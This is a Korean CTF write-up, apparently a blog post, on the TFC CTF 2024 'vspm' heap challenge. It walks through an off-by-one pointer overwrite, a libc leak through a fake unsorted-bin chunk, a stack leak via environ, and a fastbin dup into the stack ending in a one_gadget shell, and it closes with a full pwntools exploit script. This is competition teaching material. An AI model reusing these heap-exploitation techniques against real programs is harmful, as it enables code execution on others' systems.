+++
title = "TFC CTF 2024 - vspm"
date = "2024-08-21"
description = "TFC CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "heap manipulation", "unsorted bin", "double free", "fastbin dup into stack"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/vspm'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

### Structure
``` c
struct password {
    char *credential;
    char name[0x20];
}
```

위와 같이 구성된 구조체를 최대 `code_base + 0x4060` 영역에 10개까지 저장할 수 있다.


## 0x01. Vulnerability
``` c
unsigned __int64 save_12EE()
{
  ...
  __isoc99_scanf("%d", &len);
  getchar();
  if ( len >= 0x79 )
  {
    puts("Sorry, not enough resources!");
    exit(0);
  }
  ...
  password_4060[i].credential = malloc(len);
  printf("Enter credentials: ");
  read(0, password_4060[i].credential, (len + 1));
  printf("Name of the credentials: ");
  read(0, password_4060[i].name, (len + 1));
  ...
}
```

`password`를 저장하는 `save()`에서 `credential`의 사이즈 `len`을 입력받고, `len + 1`만큼 `read`를 한다.
그런데 고정된 길이(0x20)의 `name`도 `len + 1`만큼 `read`를 하기 때문에 다음 `password` 구조체의 `credential`을 overwrite할 수 있다.

`credential`에서도 `len + 1`만큼 값을 쓸 수 있기 때문에 다음 chunk의 header 첫 바이트를 overwrite할 수는 있지만 `prev_size`를 바꿔서 exploit으로 이어갈 아이디어가 떠오르지 않았다.


## 0x02. Exploit
Exploit을 진행하기에 앞서 보호기법을 확인해보면 code, stack, libc 모든 영역이 변동되는 상태이다.
따라서 현재 가지고 있는 `credential` overwrite 취약점을 가지고 최소 한 영역의 memory leak을 해야겠다는 생각이 들었다.

### Libc Leak
Heap에서 활용할 수 있는 memory leak 테크닉 중 unsorted bin을 이용한 `main_arena` leak이 많이 사용된다.
`main_arena`는 libc 영역이기 때문에 offset 계산만 해주면 libc base를 획득할 수 있다.

문제는 크기가 0x80 이상인 chunk를 `free`시켜야 unsorted bin에 추가되는데 입력할 수 있는 `len`은 0x79가 최대이다.
Heap의 chunk들이 차례대로 쌓이고, 주소에서 `0xXXXXXXXXXXXXX000` 부분만 변동되므로 fake chunk를 구성하고 `credential` overwrite 취약점을 이용하여 다음 `password` 구조체의 `credential`이 fake chunk를 가리키게 할 수 있다.

``` python
    payload = p64(0)                                # fake chunk -> prev_size
    payload += p64(0x111)                           # fake chunk -> size
    save(s, 0x30, payload, b"0000")
    save(s, 0x30, b"BBBB", b"1111")
    save(s, 0x30, b"CCCC", b"2222")
    save(s, 0x40, b"DDDD", b"3333")
    save(s, 0x30, payload, b"4444")
    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")
```

먼저 `0000`, `4444`, top chunk의 offset 차이를 고려해서 chunk들을 배치한다.

처음에는 `0000`, `4444`의 offset 차이만 고려하면 되는 줄 알았는데, top chunk와도 offset 차이가 맞아야 fake chunk의 `free`가 성공한다.

``` bash
# first password structure
gef➤  x/5gx 0x555555558060
0x555555558060: 0x000055555555d010      0x0000000030303030
0x555555558070: 0x0000000000000000      0x0000000000000000
0x555555558080: 0x0000000000000000
# first fake chunk header
gef➤  x/2gx 0x000055555555d010
0x55555555d010: 0x0000000000000000      0x0000000000000111
# second fake chunk header
gef➤  x/2gx 0x000055555555d010 + 0x110
0x55555555d120: 0x0000000000000000      0x0000000000000111
# top chunk
gef➤  x/2gx 0x000055555555d010 + 0x220
0x55555555d230: 0x0000000000000000      0x0000000000020dd1
```

이제 `2222`의 `credential`이 fake chunk를 가리키게 만들기 위해 다음과 같이 payload를 작성했다.

``` python
    delete(s, b"1")                                 # free "1111"
    save(s, 0x30, b"BBBB", b"1" * 0x20 + b"\x20")   # alloc "1111" and overwrite next pointer
    delete(s, b"2")                                 # free fake chunk -> unsorted bin
```

`1111`을 이용해서 `2222`의 `credential`이 `0x55555555d020`을 가리키게 만들면 `0x55555555d010`에 넣은 값이 chunk header가 된다.
이제 `2222`를 `free`하면 0x100짜리 chunk를 `free`한 것으로 되어 unsorted bin으로 이동한다.

``` bash
────────────────────────── Unsorted Bin for arena at 0x7ffff7dd0b60 ──────────────────────────
[+] unsorted_bins[0]: fw=0x55555555d010, bk=0x55555555d010
 →   Chunk(addr=0x55555555d020, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
gef➤  x/4gx 0x55555555d010
0x55555555d010: 0x0000000000000000      0x0000000000000111
0x55555555d020: 0x00007ffff7dd0bc0      0x00007ffff7dd0bc0
```

이 과정에서 `free`된 chunk의 `fd`, `bk`에 `main_arena` 주소가 쓰여진다.
이후 `malloc`으로 해당 영역을 반환받아도 메모리를 초기화하지 않기 때문에 `check()`를 통해 leak이 가능하다.

다행히 0x100보다 작은 chunk를 요청해도 unsorted bin을 분할해서 할당해주기 때문에 대충 0x30짜리 chunk를 요청했다.

``` python
    save(s, 0x30, b"\xc0", b"2222")                 # alloc from unsorted bin
    r = check(s)
    arena = 0x3b4cc0
    libc = u64(r.split(b"2222 --> ")[1][:6] + b"\x00\x00") - arena
    log.info(f"libc : {hex(libc)}")
```

이 때 입력한 `\xc0`은 디버거로 확인한 `main_arena`의 첫 바이트인데 어차피 offset을 계산하면 되기 때문에 맞춰줄 필요는 없지만 입력을 아예 주지 않을 수는 없기 때문에 맞춰주었다.

### Stack Leak
Libc leak을 성공했으니 `credential` overwrite와 `check()`를 이용하여 libc의 모든 영역을 출력할 수 있다.
Libc 영역 중 `environ` 변수에 stack 주소가 저장되어있으므로 이를 이용해 stack leak을 진행하였다.

``` python
    delete(s, b"0")
    environ = 0x3b75d8
    payload = b"0" * 0x20
    payload += p64(libc + environ)
    save(s, 0x30, b"AAAA", payload)
```

먼저 `0000`을 `free`하고 `1111`의 `credential`이 `environ`을 가리키도록 overwrite한다.

``` python
    r = check(s)
    stack = u64(r.split(b"1111 --> ")[1][:6] + b"\x00\x00") - 0x110
    log.info(f"stack : {hex(stack)}")
```

`1111`이 `environ`을 가리키고 있고 `check()`에서 `credential` 정보를 출력해주는 것을 이용해서 `environ`에 저장된 stack 주소를 획득할 수 있다.

### Fastbin Dup into Stack
앞서 `credential` overwrite 취약점을 이용해서 `credential`이 fake chunk를 가리키게 한 것과 비슷하게 다른 `credential`을 가리키게 해서 double free 취약점을 트리거할 수 있다.

``` python
    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, b"HHHH", b"7777")
```

먼저 위 payload를 실행하면 `password` 구조체는 다음과 같은 값을 가지게 된다.

``` bash
gef➤
0x555555558128: 0x000055555555d1d0      0x0000000035353535
0x555555558138: 0x0000000000000000      0x0000000000000000
0x555555558148: 0x0000000000000000
gef➤
0x555555558150: 0x000055555555d160      0x0000000036363636
0x555555558160: 0x0000000000000000      0x0000000000000000
0x555555558170: 0x0000000000000000
gef➤
0x555555558178: 0x000055555555d240      0x0000000037373737
0x555555558188: 0x0000000000000000      0x0000000000000000
0x555555558198: 0x0000000000000000
```

Double free 취약점을 트리거하기 위해 `7777`의 `0x55555555d240`을 `5555`의 `0x55555555d1d0`으로 덮어야한다.

여기에서 `credential`의 사이즈가 0x60인 이유는 후술하도록 하고, 0x60짜리 chunk를 3개 할당받다보니 chunk 주소의 두 번째 바이트가 달라진다.
`0xd1d0` 중 `0x1d0`은 고정이고 `0xd000`부분만 변동될 것이므로 여기에서 1/16 확률로 exploit에 성공한다.

Fastbin을 어떻게 잘 조작하거나 heap leak을 하면 가능할 것 같긴 한데 확률이 그리 낮지 않아서 그냥 진행하기로 했다.

``` python
    delete(s, b"6")
    save(s, 0x60, b"GGGG", b"6" * 0x20 + b"\xd0\xd1")
    
    delete(s, b"5")
    delete(s, b"6")
    delete(s, b"7")
```

위 payload와 같이 `7777`의 `credential`을 `5555`의 `credential`과 일치시키고 `5555`, `6666`, `7777`순으로 `free`를 하게 되면 다음과 같이 fastbin이 구성된다.

- `0x55555555d1d0` -> `0x55555555d160` -> `0x55555555d1d0`

이제 `malloc`을 통해 0x60 사이즈의 chunk를 요청하면 `0x55555555d1d0`을 할당받을 수 있고, 여기에 stack의 주소를 쓴 뒤 해당 주소 위에 fake chunk header를 쓸 수 있다면 fastbin list에 추가된다.

따라서 거꾸로 fake chunk header를 구성할 수 있는 stack의 위치를 찾아보았는데, 처음에는 `save()`의 stack을 활용하려고 했다.

``` c
unsigned __int64 save_12EE()
{
  unsigned int len; // [rsp+8h] [rbp-68h] BYREF
  int i; // [rsp+Ch] [rbp-64h]
  ...
}
```

`len`, `i`를 이용하여 fake chunk header를 구성하면 return address까지 0x70만큼 차이가 나므로 최대 할당 크기인 0x78보다 작아 가능할 것 같았다.

그런데 문제는 0x70 크기의 chunk를 할당받으려면 `len`에 0x70을 입력해야 하는데, fake chunk header를 구성할 때는 `len`에 0x80을 입력해야 `size`가 맞기 때문에 모순이 생긴다.

그래서 다른 영역을 찾아야했는데 `return`을 해서 종료하는 함수가 없어서 고민하다가, `save()`에서 영역을 할당받고 `read`를 할 때 `read()`의 return address를 덮으면 가능할 것 같았다.

``` c
unsigned __int64 save_12EE()
{
  ...
  password_4060[i].credential = malloc(len);
  printf("Enter credentials: ");
  read(0, password_4060[i].credential, (len + 1));
  ...
}
```

문제는 다시 fake chunk header인데, `read()`의 return address를 덮을 수 있는 영역을 `malloc()` 직전에 확인해보면 다음과 같다.

``` bash
gef➤  x/16gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbe0: 0x00007fffffffdce0      0x00007ffff7a6dd8e
0x7fffffffdbf0: 0x00007ffff7ff4000      0x0000003000000008
0x7fffffffdc00: 0x00007fffffffdcd0      0x00007fffffffdc10
0x7fffffffdc10: 0x000000000000000a      0x00007fffffffdcd4
0x7fffffffdc20: 0x0000000000000000      0x00007ffff7b030c3
0x7fffffffdc30: 0x0000000000000000      0x00007fffffffdcc0
0x7fffffffdc40: 0x00005555555551a0      0x0000555555555397
```

`0x7fffffffdbf8`에 0x60이 저장되어있지만 이 값은 `malloc()`에 인자로 전달된 값이 내부 로직을 실행하다가 저장된 값으로 이전의 모순이 똑같이 발생한다.

여기에서 트릭이 하나 있는데, chunk header는 굳이 alignment가 맞지 않아도 되기 때문에 stack 주소의 가장 상위 바이트가 0x7f인 점을 생각해서 메모리를 다시 출력해보았다.

``` bash
gef➤  x/16gx 0x7fffffffdbd5
0x7fffffffdbd5: 0x0000000000000000      0xffffffdce0000000
0x7fffffffdbe5: 0xfff7a6dd8e00007f      0xfff7ff400000007f
0x7fffffffdbf5: 0x300000000800007f      0xffffffdcd0000000
0x7fffffffdc05: 0xffffffdc1000007f      0x000000000a00007f
0x7fffffffdc15: 0xffffffdcd4000000      0x000000000000007f
0x7fffffffdc25: 0xfff7b030c3000000      0x000000000000007f
0x7fffffffdc35: 0xffffffdcc0000000      0x55555551a000007f
0x7fffffffdc45: 0x5555555397000055      0x555555618f000055
```

이렇게 fake chunk header로 활용할 수 있는 영역이 `0x7fffffffdc15`와 `0x7fffffffdc25` 두 군데가 있는데, `fd`를 `0x7fffffffdc15`로 설정할 경우는 `malloc()`에 실패하고, `0x7fffffffdc25`로 설정할 경우는 `malloc()`에 성공한다.

예상되는 이유는 해당 영역이 현재 함수의 stack 바로 위 영역이라서 `malloc()`의 stack 영역과 겹치게 되고, `malloc()` 내부적으로 stack을 사용하다가 `0x7fffffffdc15`에 저장된 값이 overwrite되는 것으로 추정된다.

어쨌거나 `0x7fffffffdc25`를 `fd`로 설정하기 위해 획득한 stack 주소와의 offset을 계산해서 `0x55555555d1d0`을 할당받은 후 입력해주면 fastbin은 다음과 같이 구성된다.

- `0x55555555d160` -> `0x55555555d1d0` -> `0x7fffffffdc35`

따라서 이후 3번째 `malloc()`에서 stack의 주소가 반환되고, offset을 계산해서 `read()`의 return address를 one shot 가젯으로 덮어주면 된다.

``` python
    payload = p64(stack - 0xa3)
    save(s, 0x60, payload, b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, payload, b"7777")
    
    delete(s, b"0")
    one_gadget = 0xe1fa1
    payload = b"A" * 0x13
    payload += p64(libc + one_gadget)
    save(s, 0x68, payload, b"0000", fin = 1)
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "vspm"
code_base = 0x0000555555554000
bp = {
    'save' : code_base + 0x12EE,
    'malloc_of_save' : code_base + 0x1414,
    'check' : code_base + 0x14ED,
    'cred' : code_base + 0x4060,
}

gs = f'''
continue
b *{bp['malloc_of_save']}
'''
context.terminal = ['tmux', 'splitw', '-hf']

def save(s, length, cred, name, fin = 0):
    s.sendline(b"1")
    s.recvuntil(b"length: ")
    s.sendline(str(length).encode())
    s.recvuntil(b"credentials: ")
    s.send(cred)
    if fin:
        return
    s.recvuntil(b"credentials: ")
    s.send(name)
    return s.recvuntil(b"Input: ")

def check(s):
    s.sendline(b"2")
    return s.recvuntil(b"Input: ")

def delete(s, index):
    s.sendline(b"3")
    s.recvuntil(b"index: ")
    s.sendline(index)
    return s.recv()

def main(port, debug):
    if(port):
        s = remote("0.0.0.0", port)
    else:
        s = process(BINARY)
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    log.info(f"cred : {hex(bp['cred'])}")
    s.recv()

    payload = p64(0)                                # fake chunk -> prev_size
    payload += p64(0x111)                           # fake chunk -> size
    save(s, 0x30, payload, b"0000")
    save(s, 0x30, b"BBBB", b"1111")
    save(s, 0x30, b"CCCC", b"2222")
    save(s, 0x40, b"DDDD", b"3333")
    save(s, 0x30, payload, b"4444")
    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")

    # libc leak
    delete(s, b"1")                                 # free "1111"
    save(s, 0x30, b"BBBB", b"1" * 0x20 + b"\x20")   # alloc "1111" and overwrite next pointer
    delete(s, b"2")                                 # free fake chunk -> unsorted bin
    save(s, 0x30, b"\xc0", b"2222")                 # alloc from unsorted bin
    
    r = check(s)
    arena = 0x3b4cc0
    libc = u64(r.split(b"2222 --> ")[1][:6] + b"\x00\x00") - arena
    log.info(f"libc : {hex(libc)}")
    
    # flush unsorted bin
    save(s, 0x60, b"HHHH", b"7777")
    save(s, 0x50, b"IIII", b"8888")
    delete(s, b"7")
    delete(s, b"8")

    # stack leak
    delete(s, b"0")
    environ = 0x3b75d8
    payload = b"0" * 0x20
    payload += p64(libc + environ)
    save(s, 0x30, b"AAAA", payload)

    r = check(s)
    stack = u64(r.split(b"1111 --> ")[1][:6] + b"\x00\x00") - 0x110
    log.info(f"stack : {hex(stack)}")

    # fastbin dup
    delete(s, b"5")
    delete(s, b"6")

    save(s, 0x60, b"FFFF", b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, b"HHHH", b"7777")
    pause()

    delete(s, b"6")
    save(s, 0x60, b"GGGG", b"6" * 0x20 + b"\xd0\xd1")
    
    delete(s, b"5")
    delete(s, b"6")
    delete(s, b"7")
    
    payload = p64(stack - 0xa3)
    save(s, 0x60, payload, b"5555")
    save(s, 0x60, b"GGGG", b"6666")
    save(s, 0x60, payload, b"7777")
    
    delete(s, b"0")
    one_gadget = 0xe1fa1
    payload = b"A" * 0x13
    payload += p64(libc + one_gadget)
    save(s, 0x68, payload, b"0000", fin = 1)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.port, args.debug)
```